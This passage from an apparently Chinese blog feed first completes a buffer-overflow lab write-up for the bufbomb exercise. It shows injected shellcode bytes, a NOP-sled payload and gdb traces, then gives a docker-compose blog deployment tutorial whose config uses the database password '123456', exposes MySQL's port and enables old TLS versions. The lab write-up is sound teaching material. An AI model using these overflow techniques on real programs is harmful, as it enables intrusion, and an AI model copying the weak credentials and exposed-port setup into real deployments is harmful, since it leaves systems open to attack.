push   ebp</span><br><span class="line">   0x804920d &lt;getbufn+1&gt;     mov    ebp, esp</span><br><span class="line">   0x804920f &lt;getbufn+3&gt;     sub    esp, 0x218</span><br><span class="line">   0x8049215 &lt;getbufn+9&gt;     lea    eax, [ebp - 0x208]</span><br><span class="line">   0x804921b &lt;getbufn+15&gt;    mov    dword ptr [esp], eax</span><br></pre></td></tr></table></figure>

<p>虽然此时<code>ebp=0x556836c0</code>,但是该值并不是原先<code>test</code>函数对应的<code>ebp</code>，实际上该地址中对应的<code>0x556836f0</code>才是原先<code>test</code>函数对应的<code>ebp</code>。</p>
<p>因此最终的payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 3.txt *&#x2F;</span><br><span class="line">68 94 33 e6 56 58 68 be</span><br><span class="line">8d 04 08 c3 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">f0 36 68 55 98 36 68 55 &#x2F;* 前4个字节修补为旧的ebp，后4个字节覆盖返回地址(即buf字符串地址) *&#x2F;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 3.txt | ./bufbomb -u yalexin</span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Boom!: getbuf returned 0x56e63394</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>

<h2 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4: Nitroglycerin"></a>Level 4: Nitroglycerin</h2><p>本关卡跟上一个类似，只不过此时栈上的内存地址是”随机“的，这就给我们定位我们的攻击代码带来了难度。</p>
<p>我们先来看一张图</p>
<p><img src="https://cdn.yalexin.top/image-20230801142819012.png" alt="image-20230801142819012"></p>
<p>上图是<code>testn</code>正常调用<code>getbufn</code>的栈帧情况，从图中我们可以知道，如果我们尝试利用栈溢出漏洞，将<code>getbufn</code>的返回值修改，那么溢出过程我们也会将<code>ebp_1</code>覆盖为我们所设定的值，而为了使得我们能够正常回到<code>testn</code>中，我们还应该恢复正确的<code>ebp</code>寄存器，然而不幸的是，本关卡中，栈上上的地址都是随机化的，因此我们不能够借助gdb直接获取<code>ebp_1</code>的值。</p>
<p>但是实际上我们可以想象一下，当程序即将从<code>getbuf</code>中返回到<code>testn</code>时，即即将执行<code>getbufn</code>的<code>ret</code>指令时，此时esp的值为图中的<code>ebp2+4</code>,当前的<code>esp</code>再加上0x28即为当初的<code>ebp_1</code>的值，因此我们可以借助相对位置来恢复<code>ebp</code>，因此栈上的攻击代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 4_code.s</span><br><span class="line"># 恢复ebp</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push   $0x56e63394 #  cookie值：0x56e63394 </span><br><span class="line">pop %eax #  修改返回值 </span><br><span class="line">push $0x8048e3a #  修改返回地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>生成对应的字节码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c -m32 4_code.s</span><br><span class="line">objdump -d 4_code.o &gt; 4_code.d</span><br><span class="line">cat 4_code.d</span><br><span class="line"></span><br><span class="line">4_code.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:   8d 6c 24 28             lea    0x28(%esp),%ebp</span><br><span class="line">   4:   68 94 33 e6 56          push   $0x56e63394</span><br><span class="line">   9:   58                      pop    %eax</span><br><span class="line">   a:   68 3a 8e 04 08          push   $0x8048e3a</span><br><span class="line">   f:   c3                      ret</span><br></pre></td></tr></table></figure>

<p>我们把这个攻击代码放在何处？我们又如何定位到该代码呢？</p>
<p>由于使用了随机化策略，因此我们还是不能够通过gdb调试的方式直接获取该字符串的地址。</p>
<p>但是实际上如果在我们的攻击代码前面插入大量的nop指令，只要我们跳转过程中来到了nop区域，最终一定可以通过不断执行“nop”指令”滑到“我们的攻击代码处。</p>
<p>因此我们可以从getbufn函数中的buf指向的内存开始，插入大量的nop指令，然后我们利用缓冲区漏洞，将返回地址指向这一片区域，为了使得我们命中这片区域的概率最大，我们可以将返回地址修改为buf字符串的”中间区域“，即<code>buf+len(buf)/2</code>。</p>
<p>我们先利用gdb大致看一下getbufn中buf字符串的大致位置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb bufbomb</span><br><span class="line">b getbufn</span><br><span class="line">run -u yalexin -n</span><br><span class="line">n</span><br><span class="line">n</span><br><span class="line">   0x8049215 &lt;getbufn+9&gt;            lea    eax, [ebp - 0x208]</span><br><span class="line">   0x804921b &lt;getbufn+15&gt;           mov    dword ptr [esp], eax</span><br><span class="line"> ► 0x804921e &lt;getbufn+18&gt;           call   Gets                     &lt;Gets&gt;</span><br><span class="line">        arg[0]: 0x556834b8 (_reserved+1037496) ◂— 0x0</span><br><span class="line">        arg[1]: 0x0</span><br><span class="line">        arg[2]: 0x0</span><br><span class="line">        arg[3]: 0x0</span><br><span class="line"> </span><br><span class="line">   0x8049223 &lt;getbufn+23&gt;           mov    eax, 1</span><br><span class="line">   0x8049228 &lt;getbufn+28&gt;           leave  </span><br><span class="line">   0x8049229 &lt;getbufn+29&gt;           ret    </span><br><span class="line"> </span><br><span class="line">   0x804922a                        nop    </span><br><span class="line">   0x804922b                        nop    </span><br><span class="line">   0x804922c &lt;initialize_bomb&gt;      push   ebp</span><br><span class="line">   0x804922d &lt;initialize_bomb+1&gt;    mov    ebp, esp</span><br><span class="line">   0x804922f &lt;initialize_bomb+3&gt;    push   esi</span><br></pre></td></tr></table></figure>

<p>从控制台中我们可以发现，此时的buf地址为0x556834b8，我们再加上256，变为0x556835b8，作为<code>getbufn</code>的返回地址，我们就有机会遇上我们的攻击代码！</p>
<p>因此最终的payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 &#x2F;* 前面是大量的nop指令  *&#x2F;</span><br><span class="line">8d 6c 24 28 68 94 33 e6 &#x2F;* 攻击代码  *&#x2F;</span><br><span class="line">56 58 68 3a 8e 04 08 c3	</span><br><span class="line">00 00 00 00				&#x2F;* 暂时修改ebp *&#x2F;</span><br><span class="line">b8 35 68 55				&#x2F;* 给一个大致的地址，使得我们能够定位到nop *&#x2F;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat 4.txt | .&#x2F;hex2raw -n | .&#x2F;bufbomb -n -u yalexin </span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>docker-compose博客系统（nginx+MySQL+Nuxt+Java）</title>
    <url>/2023/09/30/docker-compose%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%EF%BC%88nginx-MySQL-Nuxt-Java%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前博客系统是直接部署在云服务器物理机上的（严格意义上来说不算是物理机，毕竟是云服务器，哪有运行商那么好直接给你物理机？更多的可能是在物理机的基础上加了他们自己的虚拟服务），奈何家境贫寒的我，买的服务器只有2g内存，运行过程<code>node</code>线程占用内存会越来越大，排查了很久也没有找到是哪个地方存在内存泄漏，或许是框架的问题？<a id="more"></a></p>
<p>等内存占用快爆满的时候，Java进程总是会被迫下线，虽然我加了个<code>crontab</code>任务，每天重启<code>PM2</code>任务，但是如果某天博客系统被访问多了，<code>node</code>进程老早就把内存吃满了，<code>Java</code>线程可能很快就被下线了。</p>
<p>所以之前，平均每两三天我就得手动访问一下博客系统，看看是否一切都正常，作为计算机专业学生实在受不了了，好笨的方法😭。</p>
<p>干脆使用docker-compose吧，让各个容器都可以遇到错误的时候自动重启，弄个自动化部署的脚本，这样子还方便下次迁移。</p>
<h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><h2 id="docker-compose安装"><a href="#docker-compose安装" class="headerlink" title="docker-compose安装"></a>docker-compose安装</h2><h2 id="编排文件"><a href="#编排文件" class="headerlink" title="编排文件"></a>编排文件</h2><p>在<code>www</code>目录下创建文件夹<code>blogSystem</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /www</span><br><span class="line">mkdir blogSystem</span><br></pre></td></tr></table></figure>

<p>再在<code>blogSystem</code>中创建相应的文件夹：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── api</span><br><span class="line">│   ├── config</span><br><span class="line">│   │   └── application.yml</span><br><span class="line">│   ├── Dockerfile</span><br><span class="line">│   ├── link</span><br><span class="line">│   ├── log</span><br><span class="line">│   └── rblog-0.0.1-SNAPSHOT.jar</span><br><span class="line">├── compose</span><br><span class="line">│   ├── mysql</span><br><span class="line">│   │   ├── conf</span><br><span class="line">│   │   │   └── my.cnf</span><br><span class="line">│   │   └── init</span><br><span class="line">│   │       └── blog-2023-09-23.sql</span><br><span class="line">│   └── nginx</span><br><span class="line">│       ├── cert</span><br><span class="line">│       ├── conf</span><br><span class="line">│       │   ├── nginx.conf</span><br><span class="line">│       ├── conf.d</span><br><span class="line">│       ├── html</span><br><span class="line">│       └── logs</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">└── front</span><br><span class="line">    ├── Dockerfile</span><br><span class="line">    ├── nuxt.config.js</span><br><span class="line">    ├── package.json</span><br><span class="line">    ├── package-lock.json</span><br><span class="line">    └── static</span><br></pre></td></tr></table></figure>

<p>相关文件夹作用如下：</p>
<h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>后端主要在<code>api</code>文件夹下，后端容器对应的<code>Dockerfile</code>如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jre-alpine</span><br><span class="line"><span class="comment"># 容器内创建项目目录</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /opt/blog</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /opt/blog</span></span><br><span class="line"><span class="comment"># 将当前目录下文件 放入容器指定目录</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> . /opt/blog</span></span><br><span class="line"><span class="comment"># 按照日期分割日志</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"rblog-0.0.1-SNAPSHOT.jar"</span>, <span class="string">"&gt;&gt;"</span>, <span class="string">"./log/nohup`date +%Y-%m-%d`.out"</span>, <span class="string">"2&gt;&amp;1"</span>]</span></span><br></pre></td></tr></table></figure>

<p>由于后端打包后是一个可执行<code>jar</code>包，因此相对而言<code>Dockerfile</code>比较简单。</p>
<p><code>config</code>放<code>Spring Boot</code>的配置文件，其中有一个很重要的地方需要更改：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://db:3306/blog?serverTimezone=UTC&amp;characterEncoding=UTF-8&amp;useSSL=false&amp;useJDBCCompliantTimezoneShift=true&amp;useUnicode=true</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">  <span class="attr">jackson:</span></span><br><span class="line">    <span class="attr">time-zone:</span> <span class="string">GMT+8</span></span><br></pre></td></tr></table></figure>

<p>因为数据库和<code>Java</code>应用在不同的容器中，因此数据库连接不能使用<code>localhost</code>或者<code>127.0.0.1</code>，要用容器名字（这里用的是<code>db</code>）。</p>
<p><code>link</code>放的是博客系统中的业务需求，与部署不太相关。</p>
<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>数据库相关的在<code>compose/mysql</code>文件夹下，其中<code>conf</code>文件夹下放配置文件<code>my.cnf</code>，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># compose&#x2F;mysql&#x2F;conf&#x2F;my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">user&#x3D;mysql</span><br><span class="line">default-storage-engine&#x3D;INNODB</span><br><span class="line">character-set-server&#x3D;utf8</span><br><span class="line"></span><br><span class="line">port            &#x3D; 3306 # 这里端口于docker-compose里映射端口保持一致</span><br><span class="line">#bind-address&#x3D; localhost</span><br><span class="line"></span><br><span class="line">basedir         &#x3D; &#x2F;usr</span><br><span class="line">datadir         &#x3D; &#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class="line">tmpdir          &#x3D; &#x2F;tmp</span><br><span class="line">pid-file        &#x3D; &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.pid</span><br><span class="line">socket          &#x3D; &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock</span><br><span class="line">skip-name-resolve # 这个参数是禁止域名解析的，远程访问推荐开启skip_name_resolve。</span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line">port &#x3D; 3306</span><br><span class="line">default-character-set&#x3D;utf8mb4</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line">no-auto-rehash</span><br><span class="line">default-character-set&#x3D;utf8mb4</span><br></pre></td></tr></table></figure>

<p><code>init</code>文件夹下放的是初始数据库，即博客系统的数据。</p>
<h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p>前端相关的在<code>front</code>文件夹下，其中有一个<code>Dockerfile</code>，内容如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 Node.js 18 作为基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> node:<span class="number">12.16</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> yalexin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"><span class="keyword">ENV</span> NODE_ENV=production</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> HOST <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制项目文件到容器中</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装项目依赖</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建 Nuxt.js 应用</span></span><br><span class="line"><span class="comment">#RUN npm run build</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露应用所使用的端口（默认为 3000）</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Nuxt.js 应用</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"npm"</span>, <span class="string">"run"</span>, <span class="string">"start"</span> ]</span></span><br></pre></td></tr></table></figure>

<p>在<code>nuxt.config.js</code>中，代理需要更改：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">proxy: &#123;</span><br><span class="line">  <span class="string">'/api'</span>: &#123;</span><br><span class="line">      <span class="comment">// target要更改为服务器真实IP</span></span><br><span class="line">      target: <span class="string">'http://182.43.75.61:8080/api/'</span>,</span><br><span class="line">      ws: <span class="literal">false</span>,</span><br><span class="line">      changeOrigin: <span class="literal">true</span>,</span><br><span class="line">      pathRewrite: &#123;</span><br><span class="line">          <span class="string">'^/api'</span>: <span class="string">''</span>,</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>package-lock.json</code>千万别忘了一起放过来</p>
</blockquote>
<h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><p><code>nginx</code>相关的文件在文件夹<code>compose/nginx</code>下：</p>
<p>其中<code>cert</code>文件文件夹下放的是ssl证书。</p>
<p><code>conf</code>文件夹下是配置文件<code>nginx.conf</code>，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># For more information on configuration, see:</span><br><span class="line">#   * Official English Documentation: http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;</span><br><span class="line">#   * Official Russian Documentation: http:&#x2F;&#x2F;nginx.org&#x2F;ru&#x2F;docs&#x2F;</span><br><span class="line"></span><br><span class="line">user nginx;</span><br><span class="line">worker_processes auto;</span><br><span class="line">error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</span><br><span class="line">pid &#x2F;run&#x2F;nginx.pid;</span><br><span class="line"></span><br><span class="line"># Load dynamic modules. See &#x2F;usr&#x2F;share&#x2F;doc&#x2F;nginx&#x2F;README.dynamic.</span><br><span class="line">include &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;modules&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">  worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">  log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class="line">  &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class="line">  &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class="line"></span><br><span class="line">  access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  main;</span><br><span class="line"></span><br><span class="line">  sendfile            on;</span><br><span class="line">  tcp_nopush          on;</span><br><span class="line">  tcp_nodelay         on;</span><br><span class="line">  keepalive_timeout   65;</span><br><span class="line">  types_hash_max_size 4096;</span><br><span class="line"></span><br><span class="line">  include &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class="line">  default_type        application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">  # Load modular configuration files from the &#x2F;etc&#x2F;nginx&#x2F;conf.d directory.</span><br><span class="line">  # See http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;ngx_core_module.html#include</span><br><span class="line">  # for more information.</span><br><span class="line">  include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen       443 ssl;</span><br><span class="line">	# http自动转https</span><br><span class="line">    if ($server_port !~ 443)&#123;</span><br><span class="line">        rewrite ^(&#x2F;.*)$ https:&#x2F;&#x2F;$host$1 permanent;</span><br><span class="line">    &#125;</span><br><span class="line">    # 证书文件</span><br><span class="line">        ssl_certificate &quot;&#x2F;etc&#x2F;nginx&#x2F;cert&#x2F;www.yalexin.top_bundle.pem&quot;;</span><br><span class="line">    ssl_certificate_key &quot;&#x2F;etc&#x2F;nginx&#x2F;cert&#x2F;www.yalexin.top.key&quot;;</span><br><span class="line">    ssl_session_timeout 5m;</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">    server_name www.yalexin.top;</span><br><span class="line">    root         &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line"></span><br><span class="line">    include &#x2F;etc&#x2F;nginx&#x2F;default.d&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">    error_page 404 &#x2F;404.html;</span><br><span class="line">    location &#x3D; &#x2F;404.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 500 502 503 504 &#x2F;50x.html;</span><br><span class="line">    location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # 将用户请求转发到后台</span><br><span class="line">    location &#x2F;api&#x2F; &#123;</span><br><span class="line">      proxy_set_header Host $host;</span><br><span class="line">      proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">      real_ip_header    X-Forwarded-For;</span><br><span class="line">      real_ip_recursive  on;</span><br><span class="line">      # 这里用的还是容器名称</span><br><span class="line">      proxy_pass http:&#x2F;&#x2F;blog_api:8080;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    #这里是需要部署的二级目录应用配置</span><br><span class="line">    location ^~&#x2F;blog&#x2F; &#123;</span><br><span class="line"></span><br><span class="line">      proxy_set_header Host $host;</span><br><span class="line">      proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">      real_ip_header    X-Forwarded-For;</span><br><span class="line">      real_ip_recursive  on;</span><br><span class="line">	  # 这里用的还是容器名称</span><br><span class="line">      proxy_pass http:&#x2F;&#x2F;node:3000&#x2F;blog&#x2F;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 必应代理</span><br><span class="line">    location &#x2F;bingProxy&#x2F; &#123;</span><br><span class="line">      rewrite ^&#x2F;bingProxy&#x2F;(.*)$ &#x2F;$1 break;  #对加了proxy前缀的请求加以区分，真正访问的时候移除这个前缀,这个前缀需要自定义</span><br><span class="line">      proxy_pass https:&#x2F;&#x2F;cn.bing.com;  #将真正的请求代理到真实的服务器地址</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>html</code>下放的是静态文件，我放的是个人主页相关的内容，里边有地方用到了必应壁纸，因此上面的配置中有相关配置。</p>
<p><code>logs</code>放的是日志相关</p>
<h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><p>到了最重要的<code>docker-compose.yml</code>了，它描述了各个容器要做的内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">volumes:</span> <span class="comment"># 自定义数据卷，位于宿主机/var/lib/docker/volumes内</span></span><br><span class="line">  <span class="attr">reputation_db_vol:</span> <span class="comment"># 定义数据卷同步容器内mysql数据</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">node:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./front</span> <span class="comment"># 使用 front 目录下的Dockerfile</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">"3000:3000"</span></span><br><span class="line">    <span class="attr">expose:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">"3000"</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span> <span class="comment"># always表容器运行发生错误时一直重启</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=123456</span> <span class="comment"># 数据库密码</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=blog</span> <span class="comment"># 数据库名称</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">MYSQL_USER=yalexin</span> <span class="comment"># 数据库用户名</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">MYSQL_PASSWORD=123456</span> <span class="comment"># 用户密码</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">reputation_db_vol:/var/lib/mysql:rw</span> <span class="comment"># 挂载数据库数据, 可读可写</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">./compose/mysql/conf/my.cnf:/etc/mysql/my.cnf</span> <span class="comment"># 挂载配置文件</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">./compose/mysql/init:/docker-entrypoint-initdb.d/</span> <span class="comment"># 挂载数据初始化sql脚本</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">"3306:3306"</span> <span class="comment"># 与配置文件保持一致，映射端口</span></span><br><span class="line">    <span class="attr">expose:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">"3306"</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">blog_api:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">blog_api:2.0.0</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./api</span> <span class="comment"># 使用 api 目录下的Dockerfile</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">"8080:8080"</span></span><br><span class="line">    <span class="attr">expose:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">"8080"</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">./api/log:/opt/blog/log</span> <span class="comment"># 挂载后端日志</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">stdin_open:</span> <span class="literal">true</span>    